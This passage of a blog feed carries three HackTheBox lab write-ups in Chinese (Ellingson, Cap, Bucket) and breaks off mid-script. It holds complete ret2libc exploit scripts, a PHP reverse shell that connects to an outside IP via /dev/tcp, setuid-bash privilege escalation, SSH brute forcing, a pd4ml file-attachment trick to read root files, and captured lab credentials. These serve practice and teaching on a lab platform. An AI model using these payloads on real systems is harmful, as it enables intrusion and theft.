    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f41e478b9c0
libcbase:0x7f41e470b000
system_addr:0x7f41e475a440
bin_sh_addr = 0x7f41e48bee9a/3
```

### GetShell

得到需要的地址后，我们可以进行获取`Shell`了

再此之前，我们还需要一个`ret`来实现堆栈平衡

```bash
(pwn) ➜  Ellingson ROPgadget --binary garbage --only "ret"    
Gadgets information
============================================================
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089
```

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload2)
p.interactive()
```

然后我们运行，但是权限只是 `margo`的权限

```bash
$ $ id
uid=1002(margo) gid=1002(margo) groups=1002(margo)
```

### GetRootShell

我们还需要进行将`shell`权限提升，可以使用`setuid`

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

setuid_addr = libcbase + libc.sym['setuid']

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload2)
p.interactive()
```

运行获得 `RootShell`

```bash
(pwn) ➜  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 22208
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7fc6c64fd9c0
libcbase:0x7fc6c647d000
system_addr:0x7fc6c64cc440
bin_sh_addr = 0x7fc6c6630e9a
[*] Switching to interactive mode

Enter access password: 
access denied.
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
```

```bash
# $ cat /root/root.txt
d87f7aac2d13c429b8d30e11be174dd6
```

## 总结

爽。

打到缓冲区溢出无从下手，花了一天多时间恶补`ROP` ，然后一命通关

太爽了。

![image.gif](/post-images/HackTheBoxMachine%20-%20Ellingson/vibePls-4x.gif)
]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>PWN</category>
            <category>ret2libc</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Cap]]></title>
            <link>https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap</guid>
            <pubDate>Wed, 11 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Cap https://app.hackthebox.com/machines/Cap | Linux | Easy 大名鼎鼎的Cap，新手关 Recon nmap端口扫描 有FTP服务的存在，我们首先枚举FTP ，但是并不支持匿名用户访问 访问 HTTP ，一个后台管理的模板 有一...]]></description>
            <content:encoded><![CDATA[
# Machine - Cap

> https://app.hackthebox.com/machines/Cap | `Linux` | `Easy`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image.png)

大名鼎鼎的`Cap`，新手关

## Recon

`nmap`端口扫描

```bash
➜  Cap nmap -sT -min-rate 5000 10.10.10.245    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST
Nmap scan report for 10.10.10.245
Host is up (0.072s latency).
Not shown: 701 closed tcp ports (conn-refused), 296 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

```bash
➜  Cap nmap -sT -A -p 21,22,80 10.10.10.245                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST
Nmap scan report for 10.10.10.245
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   110.57 ms 10.10.16.1
2   55.69 ms  10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds
```

有`FTP`服务的存在，我们首先枚举`FTP` ，但是并不支持匿名用户访问

```bash
➜  Cap ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

访问 `HTTP` ，一个后台管理的模板

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image1.png)

有一些很有趣的功能

在 `/data/3` 中能下载一个 `pcap`文件

`/ip` 能看到`ip add` 命令执行的结果

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image2.png)

`/netstat` 中能发现端口和进程信息

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image3.png)

发现了一个有趣的点 `/data/x` 是会增加的，能观察到最大是到`9`

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image4.png)

## IDOR - 不安全的直接对象引用

下载的`pcap`文件貌似是一段时间内通过的流量，我们一直`ping` ，等待它更新，更新后我们将`pcap`文件下载下来打开，能确定就是它捕获的流量

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image5.png)

可以尝试一直下载 `pcap` 文件，捕捉下载时的流量

```bash
➜  Cap for i in {0..9};do curl 10.10.10.245/download/${i} --output ${i}.pcap;sleep 1;done
```

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image6.png)

当我们分析到`0.pcap`文件的时候，能发现捕捉到了`FTP`的包，这在其他`>1.pacp`的数据包中是没有的

所以这里出现了应用逻辑上的错误，敏感信息泄露 (Sensitive Information Disclosure)，不安全的直接对象引用 (Insecure Direct Object Reference - IDOR)

并且后端代码中可能是：

```bash
def download_file(i):
    # 当 i=0 时，有一个特殊处理，可能用于调试或测试
    if i == 0:
        file_path = "/var/log/debug/ftp_capture.pcap" # 指向了一个开发/运维人员留下的调试文件
    else:
        # 正常逻辑
        file_path = f"/var/www/downloads/file_{i}.data"
    # 检查文件是否存在并返回给用户
    if file_exists(file_path):
        return send_file(file_path)
    else:
        return "File not found"
```

然后我们得到了它

并且`FTP`数据包中带有`nathan`用户的凭据，`nathan:Buck3tH4TF0RM3!`

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image7.png)

凭据可以进去到 `FTP`

```bash
➜  Cap ftp 10.10.10.245                                                                  
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||24592|)
150 Here comes the directory listing.
-rw-rw-r--    1 1001     1001          408 Jun 11 04:18 index.html
drwxr-xr-x    3 1001     1001         4096 Jun 11 04:28 snap
-r--------    1 1001     1001           33 Jun 10 19:39 user.txt
226 Directory send OK.
```

也可以进行 `SSH` 登录

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image8.png)

当前家目录下可以读取`user.txt`

```bash
nathan@cap:~$ cat user.txt 
c5a3b7e60be43d07acb3580714228ee7
```

## 权限提升

运行`Web`的`app.py` 里面的信息很有趣，`setuid(0)`

![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image9.png)

但是我们可以注意到是以`nathan`权限运行的，那么`setuid(0)` 要怎么才能有效呢？

```bash
nathan@cap:/var/www/html$ ls -al
total 32
drwxr-xr-x 6 nathan nathan 4096 Jun 11 09:47 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
drwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__
-rw-r--r-- 1 nathan nathan 4267 Jun 11 09:43 app.py
drwxr-xr-x 6 root   root   4096 May 23  2021 static
drwxr-xr-x 2 root   root   4096 May 23  2021 templates
drwxr-xr-x 2 root   root   4096 Jun 11 09:42 upload
```

我们直接运行`python` ，直接就能拿到 `root` 权限了

```bash
nathan@cap:/var/www/html$ python3
python3           python3-config    python3.8         python3.8-config  
nathan@cap:/var/www/html$ python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os;os.setuid(0)
>>> os.system(id)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method
>>> os.system('id')
uid=0(root) gid=1001(nathan) groups=1001(nathan)
0
>>> os.system('chmod +s /bin/bash')
0
```

```bash
bash-5.0# cat root.txt 
6b21801e0d9e7354cfa2de802cf89dcd
```

通过 `getcap` 命令也能知道为什么会有该权限

```bash
nathan@cap:/var/www/html$ which python3
/usr/bin/python3
nathan@cap:/var/www/html$ which python3.8
/usr/bin/python3.8
nathan@cap:/var/www/html$ getcap /usr/bin/python3
nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>Capabilities</category>
            <category>IDOR</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Bucket]]></title>
            <link>https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket</guid>
            <pubDate>Fri, 06 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon 端口扫描 访问 HTTP 主页上没有一点信息，对目录进行爆破 但是我注意到源代码中的图片是通过子域名http://s3.bucket.ht...]]></description>
            <content:encoded><![CDATA[
# Machine - Bucket

> https://app.hackthebox.com/machines/Bucket | `Linux` | `Medium`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image.png)

## Recon

端口扫描

```bash
➜  Bucket nmap -sT -min-rate 5000 10.10.10.212
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

```bash
➜  Bucket nmap -sT -A -p 22,80 10.10.10.212                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   108.02 ms 10.10.16.1
2   54.68 ms  bucket.htb (10.10.10.212)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds
```

访问 `HTTP`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image1.png)

主页上没有一点信息，对目录进行爆破

```bash
➜  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://bucket.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, zip, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[#>------------------] - 88s    46359/882180  23m     found:0       errors:37     
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_bucket_htb_-1749173567.state ...
[#>------------------] - 88s    46399/882180  23m     found:0       errors:37     
[#>------------------] - 88s    46400/882180  527/s   http://bucket.htb/         
```

但是我注意到源代码中的图片是通过子域名`http://s3.bucket.htb` 中获取的

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image2.png)

将其添加到 `hosts`，并访问，只显示 `running`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image3.png)

网上搜索 `s3` 大部分都是 `AWS S3` ，所以假定这是一个 `AWS S3` 实例

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image4.png)

跑一下目录扫描，能找到两个子目录

```bash
➜Bucket gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0]
/server-status        (Status: 403)
```

## AWS S3

> 关于AWS S3 https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html
> 

根据手册，`adserver`是一个存储桶，`images/bug.jpg` 是对象键，`http://s3.bucket.htb` 是端点

访问 `/shell` 会被重定向到一个奇怪的`URL`，看起来只像是只有内网可以访问

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image5.png)

访问 `/health` 发现除了 s3 还运行着 `dynamodb`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image6.png)

> 关于 Dynamodb https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html
> 

从文档上看，Dynamodb 和 S3 都可以使用 Amazon CLI 来访问，并且两个应用都是可以集成的

### Dynamodb

访问`Dynamodb`前，要先配置  `aws-cli`

PS：官方配置需要 Access ID，并且注册需要信用卡，以为差点无了，看了下WP才知道可以瞎填

```bash
➜  Bucket aws configure           
AWS Access Key ID [None]: sunsetaction
AWS Secret Access Key [None]: sunsetaction
Default region name [None]: CN
Default output format [None]: json
```

列出所有表

```bash
➜  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
{
    "TableNames": [
        "users"
    ]
}
```

查询表的数据，可以得到几个用户凭据

```bash
➜  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name users
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

将其拿去对`ssh`进行碰撞，但是无结果，貌似也能对数据进行写入，但是现在也没用

### 文件上传

我们通过文档 https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html 可以知道存在 `aws s3 ls` 命令，该命令作用是将在单个非分页调用中列出您账户中的所有通用存储桶。

```bash
➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls
2025-06-06 15:06:03 adserver
```

命令结果是我们和`images` 在同一目录下

我们查看帮助还能看到 `cp` 命令，那么代表可能可以对文件进行上传

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image7.png)

我们上传一个文件测试一下

```bash
➜  Bucket echo '<?php phpinfo();?>' > test.php                                                                                                                         

➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 cp test.php s3://adserver/test.php
upload: ./test.php to s3://adserver/test.php 
```

可以上传，但是貌似无法解析

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image8.png)

这里看了下`WP`，之前进行目录扫描`s3`的时候能扫描到`/server-status` ，那么该处和`bucket.htb`可能在同一目录下，而且可以支持解析 `php` 拓展名

在 `adserver` 目录下没有

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image9.png)

这里通过 `ls` 命令来查看 `adserver`文件夹内的文件，可以看到存在`index.html` ，那么可能就是主站

```bash
➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver                    
                           PRE images/
2025-06-06 15:48:02       5344 index.html
```

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image10.png)

进行反弹 `shell`

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.69/1234 0>&1'");?>
```

和之前一样的操作可以直接获得弹回来的 `shell`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image11.png)

## 权限提升

### 密码碰撞

发现存在用户`roy`

```bash
www-data@bucket:/var/www$ ls /home
roy
```

我们使用的到的密码进行碰撞

```bash
➜  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.212:22/
[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06
```

成功得到 `Roy`的`shell`

```bash
➜  Bucket ssh roy@10.10.10.212   
roy@10.10.10.212's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 06 Jun 2025 07:52:46 AM UTC

  System load:                      0.05
  Usage of /:                       33.9% of 17.59GB
  Memory usage:                     30%
  Swap usage:                       0%
  Processes:                        256
  Users logged in:                  2
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55

229 updates can be installed immediately.
103 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jun  6 06:08:21 2025 from 10.10.16.27
roy@bucket:~$ 
```

当前目录下能得到 `user.txt`

```bash
roy@bucket:~$ cat user.txt
6e375b41aac41437da7b58d400a30c74
```

### 信息收集

`db.php`

```bash
roy@bucket:~/project$ cat db.php
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

内部开放了好几个端口

```bash
roy@bucket:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process
udp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*
tcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*
tcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*
tcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*
tcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*
tcp                    LISTEN                  0                       511                                                  *:80                                                   *:*
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*
```

我们将 `4566`和 `8000`端口转发出去

```bash
roy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 &
[1] 145731
roy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &
[2] 145736
```

其中 `8000`端口是貌似未完工的

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image12.png)

`4566`像是`s3`的端点

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image13.png)

尝试通过`aws`访问

```bash
➜  Bucket aws --endpoint-url http://bucket.htb:4567 s3 ls
2025-06-06 16:04:01 adserver
```

可能是一个内部端点，尝试读取数据库

```bash
➜  Bucket aws dynamodb list-tables --endpoint-url http://bucket.htb:4567
{
    "TableNames": [
        "Music",
        "users"
    ]
}
```

`users`和我们在外部端点访问的一样，`Music`是空的（可能其他人使用官方文档中的语句创建的），感觉就是之前的外部端点

### To root

回到`8000`端口，我们发现这是一个不小的项目，线路也可能在这里

```bash
roy@bucket:/var/www/bucket-app$ ls
composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
```

```bash
roy@bucket:/var/www$ getfacl bucket-app/
# file: bucket-app/
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

`index.php`

```bash
roy@bucket:/var/www/bucket-app$ cat index.php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```

逻辑大概是通过`POST`方法访问，并且参数`action`等于`get_alerts` 时，对数据进行连接，然后循环`alerts`表并筛选表达式中 `:title` 占位符的值，这里为 "`Ransomware`"。再下面的循环上边筛选后的值，生成一个1到10000之间的随机数，并附加 `.html` 后缀，作为 HTML 文件名，并将筛选后的值的`data`写入`HTML` 文件。暗示了你的 DynamoDB `alerts` 表中的项目的 `data` 属性存储的是 HTML 内容。

最后一行，调用了`pd4ml_demo.jar` ，提供用于 HTML 到 PDF 转换的基本 Java API，包括 PD4ML JSP 标签库。

那么最后一句就是将生成`HTML`文件钻换成`PDF`文件，并存放在`files/result.pdf`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image14.png)

我们观察`files`文件夹没有任何文件产生，应该是表`alerts`不存在，我们首先创建`alerts`表

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
    --provisioned-throughput \
        ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --endpoint-url http://bucket.htb:4567
```

```bash
aws dynamodb tables-list --endpoint-url http://bucket.htb:4567
{
    "TableNames": [
        "Music",
        "alerts",
        "users"
    ]
}
```

但是我们能发现一会后，`alerts`表就会被删除，所以我们要通过脚本来执行操作

尝试包含文件，这里我们查看`pd4ml`的文档，其中有一项是添加附件：https://pd4ml.com/support-topics/usage-examples/#add-attachment

```bash
<html><pd4ml:attachment style=\"align: right\" type=\"paperclip\" src=\"/root/root.txt\"/></html>
```

编写脚本

```bash
echo 'create table alerts\n'
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
    --provisioned-throughput \
        ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --endpoint-url http://bucket.htb:4567

sleep 2;
echo 'create talbe success?\n'
aws dynamodb list-tables --endpoint-url http://bucket.htb:4567
sleep 2;
echo 'Insert data:\n'
aws dynamodb put-item \
